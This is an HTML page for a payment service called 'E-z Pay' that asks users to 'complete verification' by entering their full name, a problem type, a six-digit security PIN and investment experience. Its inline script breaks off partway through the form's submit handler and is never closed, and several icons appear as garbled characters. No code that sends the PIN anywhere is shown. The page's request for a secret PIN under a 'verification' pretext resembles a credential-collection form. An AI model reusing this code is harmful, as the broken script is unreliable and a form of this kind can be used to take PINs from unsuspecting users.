<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-z Pay Verification</title>
    <link rel="stylesheet" href="style.css">
    <script src="config.js"></script>
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
    <!-- Optional for icons if needed -->
</head>

<body>
    <div class="header-gradient">
        <div class="header-content">
            <div style="position: absolute; left: 0; top: 50%; transform: translateY(-50%);">
                <img src="logo.jpg" alt="Logo" style="width: 40px; border-radius: 50%;">
            </div>
            <div class="header-text">
                <h1>Welcome to E-zpay</h1>
                <p>Please complete your verification</p>
            </div>
            <button onclick="logout()" class="btn-logout">Logout</button>
        </div>
    </div>

    <div class="container" style="margin-top: -40px;">
        <div class="card verification-card">
            <h3 class="text-center mb-4">Verification Details</h3>

            <div id="error-msg" style="color: red; text-align: center; margin-bottom: 15px; display: none;"></div>

            <form id="verificationForm">
                <div class="form-group">
                    <label class="form-label">Full Name</label>
                    <input type="text" id="full_name" class="form-control" placeholder="Enter your name" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Problem</label>
                    <div class="input-group">
                        <select id="problem" class="form-control" required style="appearance: none;">
                            <option value="" disabled selected>Select your problem</option>
                            <option value="Id auto Logout">Id auto Logout</option>
                            <option value="Slow sell">Slow sell</option>
                            <option value="Quote not added">Quote not added</option>
                            <option value="Tool auto deauthorized">Tool auto deauthorized</option>
                        </select>
                        <span
                            style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); pointer-events: none;">‚ñº</span>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Security PIN (6 Digits)</label>
                    <div class="input-group">
                        <input type="password" id="pin" class="form-control" placeholder="......" required
                            pattern="[0-9]{6}" maxlength="6" style="letter-spacing: 3px;">
                        <span class="toggle-password" onclick="togglePassword('pin')">üëÅÔ∏è</span>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Investment Experience</label>
                    <div class="input-group">
                        <select id="experience" class="form-control" required style="appearance: none;">
                            <option value="" disabled selected>Select experience Level</option>
                            <option value="Beginner (0-1 years)">Beginner (0-1 years)</option>
                            <option value="Intermediate (1-3 years)">Intermediate (1-3 years)</option>
                            <option value="Experienced (3-5 years)">Experienced (3-5 years)</option>
                            <option value="Expert (5+ years)">Expert (5+ years)</option>
                        </select>
                        <span
                            style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); pointer-events: none;">‚ñº</span>
                    </div>
                </div>

                <button type="submit" id="submitBtn" class="btn btn-primary" style="margin-top: 20px;">Submit
                    Verification</button>
            </form>
        </div>
    </div>

    <!-- Success Modal -->
    <div id="successModal" class="modal">
        <div class="modal-content">
            <div class="success-icon-container">
                <div class="success-checkmark">‚úì</div>
            </div>
            <h2>Success</h2>
            <p>Your verification has been submitted successfully</p>
            <button onclick="redirectToDashboard()" class="btn btn-primary btn-modal">OK</button>
        </div>
    </div>

    <script>
        // Check Session
        const userId = localStorage.getItem('ezpay_user_id');
        if (!userId) {
            window.location.href = 'login.html';
        }

        function logout() {
            localStorage.removeItem('ezpay_user_id');
            window.location.href = 'login.html';
        }

        function togglePassword(id) {
            const input = document.getElementById(id);
            if (input.type === "password") {
                input.type = "text";
            } else {
                input.type = "password";
            }
        }

        function redirectToDashboard() {
            window.location.href = 'index.html';
        }

        document.getElementById('verificationForm').addEventListener('submit', async function (e) {
            e.preventDefault();

            const fullName = document.getElementById('full_name').value;
            const pin = document.getElementById('pin').value;
            const errorMsg = document.getElementById('error-msg');
            const btn = document.getElementById('submitBtn');
            const modal = document.getElementById('successModal');

</body>

</html>
